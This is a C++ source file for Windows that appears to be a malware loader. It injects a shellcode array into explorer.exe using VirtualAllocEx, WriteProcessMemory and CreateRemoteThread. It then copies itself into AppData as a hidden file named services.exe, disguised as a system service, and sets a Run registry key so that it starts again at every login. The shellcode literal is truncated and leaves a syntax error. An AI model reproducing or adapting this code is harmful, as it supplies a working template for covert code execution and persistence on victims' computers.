#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <stdlib.h>

bool RegisterSystemTask(const std::string& executablePath) {
    HKEY hKey;
    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "SystemCoreService";

    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
    if (openRes != ERROR_SUCCESS) {
        return false;
    }

    LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
    if (setRes != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

enum RelocateResult {
    RELOCATE_SUCCESS,
    RELOCATE_ALREADY_EXISTS,
    RELOCATE_FAILED
};

RelocateResult RelocateModule(std::string& newPath) {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    const char* appDataPath = getenv("APPDATA");
    if (appDataPath == NULL) {
        return RELOCATE_FAILED;
    }

    newPath = std::string(appDataPath) + "\\services.exe";

    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) { // TRUE = bFailIfExists
        DWORD error = GetLastError();
        if (error == ERROR_FILE_EXISTS) {
            return RELOCATE_ALREADY_EXISTS;
        } else {
            return RELOCATE_FAILED;
        }
    }

    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return RELOCATE_SUCCESS;
}

DWORD FindTargetProcess(const std::string& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (_stricmp(entry.szExeFile, processName.c_str()) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    char shellcode[] =  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"

    DWORD pid = FindTargetProcess("explorer.exe");
    if (pid == 0) {
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        return 1;
    }

    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode) - 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteAddress == NULL) {
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode, sizeof(shellcode) - 1, NULL)) {
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);

    // --- Persistence Logic ---
    std::string newPath;
    RelocateResult relocateResult = RelocateModule(newPath);

    if (relocateResult == RELOCATE_SUCCESS) {
        if (!RegisterSystemTask(newPath)) {
            // If persistence fails, we don't need to exit with an error,
            // as the primary payload has already been delivered.
        }
    }
    // If it already exists or failed, do nothing.

    return 0;
}
